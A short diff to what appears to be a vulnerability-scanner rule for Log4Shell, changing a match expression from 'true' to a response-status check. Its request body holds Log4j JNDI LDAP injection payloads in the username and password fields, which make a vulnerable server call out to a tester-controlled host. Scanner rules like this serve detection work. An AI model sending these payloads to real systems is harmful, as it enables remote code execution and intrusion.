@@ -22,7 +22,7 @@ rules:
       headers:
         Content-Type: application/x-www-form-urlencoded
       body: username=${jndi:ldap://{{dnstest}}/tea}&password=${jndi:ldap://{{dnstest}}/lol}&submit=
-    expression: "true"
+    expression: response.status >= 200
   r3:
     request:
       method: GET
